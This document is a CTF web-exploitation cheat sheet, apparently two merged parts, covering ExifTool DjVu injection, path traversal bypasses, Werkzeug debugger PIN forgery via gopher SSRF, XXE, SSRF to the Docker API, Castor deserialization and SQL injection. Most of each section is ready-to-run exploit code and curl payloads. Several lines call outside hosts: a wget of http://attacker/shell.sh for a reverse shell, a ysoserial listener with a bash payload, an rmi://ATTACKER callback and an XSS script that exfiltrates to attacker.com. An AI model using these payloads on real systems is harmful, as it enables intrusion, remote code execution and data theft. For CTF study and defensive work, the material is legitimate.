# CTF Web - Advanced Server-Side Techniques

## Table of Contents
- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)
- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch--command-injection-vuwctf-2025)
- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
  - [Brace Stripping](#brace-stripping)
  - [Double URL Encoding](#double-url-encoding)
  - [Python os.path.join](#python-ospathjoin)
- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
- [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
- [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
- [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)

See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSRF-to-Docker, Castor XML, Apache ErrorDocument, SQLite path traversal, HQL non-breaking space, base64 path traversal, 8.3 short filename bypass, parse_url @ bypass, PHP zip:// LFI, XSS-to-SSTI, INSERT column shift, session cookie forgery). See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3 (WAV polyglot, multi-slash URL bypass, Xalan math:random, SoapClient CRLF, gopher no-host, SSRF credential leak). See also: [server-side-advanced-4.md](server-side-advanced-4.md) for Part 4 (WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS sslsplit, CairoSVG XXE, Bazaar repo reconstruction).

---

## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)

**Affected:** ExifTool ≤ 12.23

**Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.

**Craft minimal DjVu exploit:**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

**Detection:** Check ExifTool version. DjVu format is the classic vector. Upload the crafted DjVu to any endpoint that processes images with ExifTool.

---

## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)

**Pattern (Go Go Cyber Ranger):** Go validates `len([]rune(input)) > 32` but copies `len([]byte(input))` bytes.

**Key insight:** Multi-byte UTF-8 chars (emoji = 4 bytes) count as 1 rune but 4 bytes → overflow.

**Exploit:** 8 emoji (32 bytes, 8 runes) + `";cmd\n"` = 40 bytes total, passes 32-rune check but overflows into adjacent buffer.

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

**Detection:** Go web app with length check on `[]rune` followed by byte-level operations (copy, buffer write). Always check for rune/byte mismatch in Go.

---

## Zip Symlink Path Traversal (UTCTF 2024)

**Pattern (Schrödinger):** Server extracts uploaded ZIP without checking symlinks.

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

**Detection:** Any upload+extract endpoint. `zip -y` preserves symlinks. Many zip extraction utilities follow symlinks by default.

---

## Path Traversal Bypass Techniques

### Brace Stripping
`{.}{.}/flag.txt` → `../flag.txt` after processing

### Double URL Encoding
`%252E%252E%252F` → `../` after two decode passes

### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)

---

### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)

**Pattern:** Nginx `alias` misconfiguration allows path traversal when a `location` block's path doesn't end with `/` but the `alias` does. The path remainder is appended unsafely, allowing `..` traversal out of the aliased directory.

```nginx
# Vulnerable Nginx configuration:
location /laravel {
    alias /var/www/html/public/;
}
# Note: /laravel has NO trailing slash, but alias has one
# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
```

```bash
# Exploit: traverse out of the public/ directory to read .env
GET /laravel../.env HTTP/1.1
# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env

# Read application source
GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1

# Read other config files
GET /laravel../config/database.php HTTP/1.1
GET /laravel../storage/logs/laravel.log HTTP/1.1
```

```python
import requests

target = "http://target"

# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
r = requests.get(f"{target}/laravel../.env")
if r.status_code == 200:
    print("[+] .env contents:")
    print(r.text)
    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
```

**Detection checklist:**
```text
# Test for the misconfiguration on common paths:
/static../
/assets../
/public../
/media../
/uploads../
/laravel../
# Any location block using alias without matching trailing slashes
```

**Key insight:** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.

---

## Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)

**Pattern:** U+2E2E (REVERSED QUESTION MARK, UTF-8: `E2 B8 AE`) normalizes to a period (U+002E, 0x2E) in some Python HTTP backends and Unicode normalization layers. Sending `%E2%B8%AE%E2%B8%AE/flag.txt` bypasses ASCII dot checks (`..` blocked) while the resolved path becomes `../flag.txt`.

```bash
# Standard path traversal blocked by ASCII dot check:
curl "http://target/files/../../flag.txt"   # blocked: contains ".."

# U+2E2E homoglyph bypass:
curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
```

```python
import requests

# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations

homoglyph_dot = '\u2E2E'
payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"

r = requests.get(f"http://target/files/{payload}")
# If backend normalizes Unicode before filesystem access but after validation:
print(r.text)
```

**Other Unicode dot homoglyphs to try:**
```text
U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
```

**Key insight:** Unicode normalization inconsistencies between the validation layer and execution layer enable path traversal with non-ASCII dot homoglyphs. U+2E2E is a lesser-known alternative to fullwidth tricks (U+FF0E). Test normalization forms NFKC and NFC — Python's `unicodedata.normalize('NFKC', char)` reveals what each character collapses to.

---

## Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)

**Pattern:** Ruby's `Regexp.escape` operates byte-by-byte. A `%bf` byte followed by `%5c` (backslash) forms a valid GBK/Big5 multibyte character, consuming the backslash. This leaves subsequent characters unescaped, breaking the intended regex escaping.

```ruby
# Regexp.escape escapes special chars by prepending backslash
# e.g., Regexp.escape("a.b") → "a\\.b"

# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
# Regexp.escape sees 0xBF → not a special char, passes through
# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
# The second backslash then escapes the NEXT character, not the intended one

# Result: subsequent input characters become unescaped in the regex
```

```python
# In a CTF context: HTTP request with GBK lead byte in parameter
import requests

# %bf%5c in URL-encoded form — in GBK this is one character
# When Ruby calls Regexp.escape on the input, the backslash is consumed
payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex

r = requests.get("http://target/search", params={"q": payload})
# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
# The .* passes through unescaped, matching any string
```

**Exploitation scenario:**
```ruby
# Vulnerable code:
pattern = /#{Regexp.escape(user_input)}/
if flag.match(pattern)
  puts "Match!"
end

# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
# In GBK context: first two bytes are one char, leaving ".*" unescaped
# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
```

**Key insight:** Byte-level escaping functions are vulnerable to multibyte character injection. A GBK/Big5 lead byte (0xBF) followed by 0x5C forms a valid single character, consuming the backslash that `Regexp.escape` just added. This leaves subsequent characters unescaped. Check for non-ASCII input handling in Ruby regex validation, especially when the application supports CJK character sets.

---

## /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)

**Pattern:** When an application filters `/proc` in file read parameters to prevent access to process information, `/dev/fd` provides an alternative path since it is a symlink to `/proc/self/fd` on Linux.

```bash
# Bypass /proc filter to read environment variables
curl "http://target/?f=/dev/fd/../environ"
# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/

# Read command line
curl "http://target/?f=/dev/fd/../cmdline"

# Read memory maps
curl "http://target/?f=/dev/fd/../maps"

# Read specific file descriptor contents
curl "http://target/?f=/dev/fd/0"   # stdin
curl "http://target/?f=/dev/fd/1"   # stdout
curl "http://target/?f=/dev/fd/3"   # often a database or config file
```

**Other /proc filter bypass paths:**
```text
/dev/fd/../environ         # → /proc/self/environ
/dev/fd/../cmdline         # → /proc/self/cmdline
/dev/fd/../maps            # → /proc/self/maps
/dev/fd/../status          # → /proc/self/status
/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
```

**Key insight:** `/dev/fd` is a symlink to `/proc/self/fd` on Linux. Traversing up with `../` reaches `/proc/self/`, bypassing blocklist checks for the literal string `/proc`. Similarly, `/dev/stdin`, `/dev/stdout`, and `/dev/stderr` link into `/proc/self/fd/` and can be used as traversal pivot points. Always test these alternatives when `/proc` is blacklisted.

---

## Flask/Werkzeug Debug Mode Exploitation

**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.

**Attack chain:**
1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request

**Werkzeug debugger RCE:** If `/console` is accessible:
1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
3. **Compute PIN cookie:**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.

---

## XXE with External DTD Filter Bypass

**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.

**Technique:** Host malicious DTD on webhook.site or attacker server:
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.

**Setup with webhook.site API:**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

## Path Traversal: URL-Encoded Slash Bypass

**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.

---

See [server-side-advanced-4.md](server-side-advanced-4.md) for WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS interception, CairoSVG XXE, and Bazaar repo reconstruction.

<!-- merged: webapp/injection/server-side-advanced.md -->

# CTF Web - Advanced Server-Side Techniques (Part 2)

## Table of Contents
- [SSRF to Docker API RCE Chain (H7CTF 2025)](#ssrf-to-docker-api-rce-chain-h7ctf-2025)
- [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
- [SQLite File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [HQL Injection via Non-Breaking Space (HackIM 2016)](#hql-injection-via-non-breaking-space-hackim-2016)
- [Base64-Encoded Path Traversal (Sharif CTF 2016)](#base64-encoded-path-traversal-sharif-ctf-2016)
- [Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)](#windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016)
- [URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)](#url-parse_url--symbol-bypass-ekoparty-ctf-2016)
- [PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)](#php-zip-wrapper-lfi-via-pngzip-polyglot-plaidctf-2016)
- [XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)](#xss-to-ssti-chain-via-flask-error-pages-secuinside-2016)
- [INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)](#insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016)
- [Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
- [SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
- [LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
- [ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)](#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)
- [Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)](#rogue-mysql-server-load-data-local-file-read-volgactf-2018)

See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, XXE external DTD, WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE).

---

## SSRF to Docker API RCE Chain (H7CTF 2025)

**Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.

**Step 1 — Discover internal services via SSRF:**
```bash
# Enumerate localhost ports through SSRF
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:8090/docs"
```

**Step 2 — Extract files from running containers via Docker archive endpoint:**
```bash
# List containers
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
```

**Step 3 — Execute commands via Docker exec API (requires POST relay):**

When SSRF only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

**For reverse shell access:**
```bash
# 1. Download shell script into container
# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]

# 2. Execute with sh (not bash — busybox containers lack bash)
# Cmd: ["sh", "/tmp/shell.sh"]
```

**Key Docker API endpoints for exploitation:**
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/version` | GET | Confirm Docker API access |
| `/containers/json` | GET | List running containers |
| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
| `/containers/<id>/exec` | POST | Create exec instance |
| `/exec/<id>/start` | POST | Run exec instance |
| `/images/json` | GET | List available images |
| `/containers/create` | POST | Create new container |

**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).

---

## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)

**Pattern:** Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes, allowing arbitrary Java class instantiation.

**Attack chain:** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → ysoserial JRMP listener → `CommonsBeanutils1` gadget → RCE

**Requires:** Java 11 (not 17+) — ysoserial gadgets fail on Java 17+ due to module access restrictions.

**XML payload example with Spring beans for RMI callback:**
```xml
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:java="http://java.sun.com">
  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <targetBeanName>
      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
      </item>
    </targetBeanName>
    <propertyPath>foo</propertyPath>
  </item>
</data>
```

```bash
# Start ysoserial JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
```

**Key insight:** Castor XML without explicit mapping files is effectively an XML-based deserialization sink. The `xsi:type` attribute acts like Java's `ObjectInputStream` — any class on the classpath can be instantiated. Check `pom.xml` for `castor-xml`, `commons-beanutils`, and `commons-collections` dependencies. JNDI (Java Naming and Directory Interface) via RMI (Remote Method Invocation) provides the callback mechanism.

**Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.

---

## Apache ErrorDocument Expression File Read (Zero HTB)

**Pattern:** Apache's `ErrorDocument` directive with expression syntax reads files at the Apache level, bypassing PHP engine disable.

**Requires:** `AllowOverride FileInfo` in userdir config.

**Attack chain:**
1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
```apache
ErrorDocument 404 "%{file:/etc/passwd}"
```
2. Request a nonexistent URL in that directory to trigger the 404 handler
3. Read PHP source via `cat -v` to see raw content:
```apache
ErrorDocument 404 "%{file:/var/www/html/stats.php}"
```

**Key insight:** Works even when `php_admin_flag engine off` disables PHP execution in user directories. The `%{file:...}` expression is evaluated by Apache itself, not PHP — so PHP disable flags are irrelevant.

**Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.

---

## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)

**Pattern:** PHP code blocks a specific input value via string equality check, then interpolates the input into a filesystem path. Path normalization bypasses the string check while resolving to the blocked resource.

**Vulnerable code:**
```php
if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
$db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
```

**Exploit:** Set `name` to `/../gamesim_GM` — this fails the `== "GM"` check, but the constructed path `/var/game_db/gamesim_/../gamesim_GM.db` normalizes to `/var/game_db/gamesim_GM.db`.

```bash
curl -X POST -b 'session=...' \
  -d 'name=/../gamesim_GM' \
  'http://target/view.php'
```

**Key insight:** String equality checks on user input are bypassed whenever the input is later used in a filesystem path that undergoes normalization. The `../` sequence is invisible to string comparison but resolved by the OS. Look for this pattern wherever user input is both validated by string comparison and interpolated into file paths, database paths, or URLs.

---

## HQL Injection via Non-Breaking Space (HackIM 2016)

Hibernate Query Language blocks subqueries. Bypass by exploiting character encoding mismatch between HQL parser and underlying database (H2):

- HQL parser treats non-breaking space (U+00A0) as a regular character (concatenates tokens into one word)
- H2 database interprets U+00A0 as whitespace (separates tokens normally)

**Key insight:** Replace spaces in SQL subqueries with U+00A0 to smuggle them past HQL validation.

```python
val = u'\u00a0'  # non-breaking space
# HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
# H2 sees:  "select flag from flag limit 1" (valid SQL)
payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) as int))=0 or ''='".format(val)
```

Error-based extraction: cast result to int triggers error containing the flag value.

---

## Base64-Encoded Path Traversal (Sharif CTF 2016)

When file inclusion uses base64-encoded filenames as parameters:

```text
file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
```

Encode traversal payloads in base64:

```python
import base64
# ../index.php
print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
# ../../etc/passwd
print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA==
```

**Key insight:** Base64 encoding absorbs path traversal characters (`../`) that filters might block in raw form.

---

## Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)

On Windows, files with long names have auto-generated 8.3 short name aliases. When a blacklist checks the full filename, the short name bypasses the filter.

```text
# Blacklisted file: file_list (e.g., readfile('file_list') is blocked)
# Windows 8.3 short name: file_l~1

# Bypass:
GET /read?file=file_l~1

# How 8.3 names are generated:
# - First 6 chars of name (minus spaces/special chars) + ~1
# - Extension truncated to 3 chars
# Examples:
#   "file_list.txt"     -> "FILE_L~1.TXT"
#   "longfilename.html" -> "LONGFI~1.HTM"
#   "program files"     -> "PROGRA~1"

# Discovery: use dir /x on Windows to list short names
# dir /x C:\path\to\files\
```

**Key insight:** Windows NTFS auto-generates 8.3 short filenames for compatibility. Blacklists checking full filenames miss the short alias. This bypass works on any Windows web server (IIS, WAMP, etc.) where 8.3 name generation is enabled (default).

---

## URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)

PHP's `parse_url()` treats the `@` symbol as a userinfo delimiter, interpreting everything before `@` as credentials and everything after as the host. This enables URL validation bypass.

```php
// Server validates URL host must be ctf.example.com
// parse_url("http://attacker.com@ctf.example.com/")
//   -> host: ctf.example.com (passes validation)

// But wget/curl follow RFC and connect to attacker.com:
// wget "http://attacker.com@ctf.example.com/"
//   -> Actually connects to: attacker.com

// Exploit for URL shortener/fetcher:
$url = "http://{$attacker_ip}@ctf.ekoparty.org/?";
// parse_url() sees host = ctf.ekoparty.org (passes whitelist)
// wget connects to $attacker_ip (attacker-controlled)

// Check attacker's Apache logs for the flag in User-Agent or request
```

**Key insight:** `parse_url()` and actual HTTP clients (wget, curl, browsers) disagree on how to handle `@` in URLs. `parse_url()` extracts the host after `@`, while HTTP clients may connect to the host before `@`. This SSRF vector bypasses domain whitelist validation.

---

## PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)

**Pattern (pixelshop):** PHP `include()` appends `.php` extension (no null byte on modern PHP). Upload is restricted to valid images (.png). Use `zip://` wrapper to include PHP code from inside a ZIP archive embedded in a PNG file.

1. Use `php://filter/read=convert.base64-encode/resource=` to leak source files and understand the include logic
2. Upload a valid PNG image to get a known filename on the server
3. Inject a ZIP archive into the PNG's palette data (ZIP format reads headers from the end of the file, so a valid PNG can simultaneously be a valid ZIP):

```python
import binascii, requests, struct

def craft_png_zip_polyglot(php_payload):
    """Craft a ZIP payload to inject into PNG palette bytes."""
    # ZIP stores its central directory at the end of the file
    # Calculate offsets based on the known PNG prefix length
    # The ZIP's local file header offset points into the palette region
    # php_payload goes inside the ZIP as "s.php"

    # Pre-built ZIP with s.php containing: <?=`$_GET[a]`?>
    zip_hex = (
        "504B0304140000000800"  # Local file header
        # ... compressed PHP shell ...
        "504B01021400140000000800"  # Central directory
        # ... points back to local header at palette offset ...
        "504B0506000000000100010033000000690000000000"  # End of central directory
    )
    return zip_hex

def inject_payload(image_key, payload_hex):
    """Use the image editor API to set palette bytes containing the ZIP."""
    palette_bytes = binascii.unhexlify(payload_hex)
    # Convert to RGB triplets for palette API
    colors = []
    for i in range(0, len(palette_bytes), 3):
        chunk = palette_bytes[i:i+3].ljust(3, b'\x00')
        colors.append(f'"#{chunk[0]:02x}{chunk[1]:02x}{chunk[2]:02x}"')
    palette_json = ",".join(colors)
    # POST to save endpoint with crafted palette
    requests.post(f"{base_url}?op=save", data={
        "imagekey": image_key,
        "savedata": f'{{"pal": [{palette_json}], "im": [{",".join(["0"]*1024)}]}}'
    })
```

4. Include the embedded PHP file via zip:// wrapper:
```text
http://target/?op=zip://uploads/HASH.png%23s
```
This unzips `HASH.png` (which is also a valid ZIP) and includes `s.php` from inside it.

**Key insight:** ZIP files store their central directory at the end, so any file format can have a valid ZIP appended (or embedded) without breaking the original format. The `zip://` PHP wrapper ignores file extensions and extracts by content. PNG palette data provides controllable consecutive bytes ideal for embedding small ZIP payloads. This bypasses: (a) file extension restrictions (.php → .png), (b) image validation (file remains a valid PNG), (c) metadata stripping (palette data is structural, not metadata).

---

## XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)

**Pattern (SBBS):** Flask app renders 404 error messages using `render_template_string()` with the request URL interpolated. Error pages only appear for localhost requests. Chain XSS → localhost fetch → SSTI in error page.

1. Flask error handler directly interpolates URL into template:
```python
@app.errorhandler(404)
def not_found(e=None):
    message = "%s was not found on the server." % request.url
    return render_template_string(template % message), 404
```

2. Error pages only render for 127.0.0.1 (external IPs get nginx 404)

3. XSS payload triggers localhost request with SSTI in the URL:
```javascript
<script>
function hack(url, callback){
    var x = new XMLHttpRequest();
    x.onreadystatechange = function(){
        if (x.readyState == 4)
            window.open('http://attacker.com/exfil?' + x.responseText, '_self', false)
    }
    x.open("GET", url, true);
    x.send();
}
hack("/{{ config.from_object('admin.app') }}{{ config.FLAG }}")
</script>
```

4. `config.from_object('module.path')` loads application config including secrets

**Key insight:** Flask's template globals don't directly expose the `app` object, but `config.from_object()` can load arbitrary Python modules into the config dict, making their attributes accessible via `{{ config.KEY }}`. The XSS-to-SSTI chain bypasses two restrictions: (a) SSTI only works on localhost error pages, (b) template globals lack direct app access. Look for `render_template_string()` with user-controlled input in error handlers.

---

## INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)

**Pattern (Illuminati):** INSERT query with two injectable fields (subject: 40-char limit, message: unlimited). Chain injections across both fields to bypass the length restriction.

```sql
-- Original query:
INSERT INTO requests (id, "$subject", "$message")

-- Subject (40 chars max):
theSubject",concat(

-- Message (unlimited):
,(select group_concat(table_name) from information_schema.tables)))#

-- Result:
INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
```

The `concat("", (select ...))` wraps the subquery result as a string value for the subject column, making it visible when the user views their own messages.

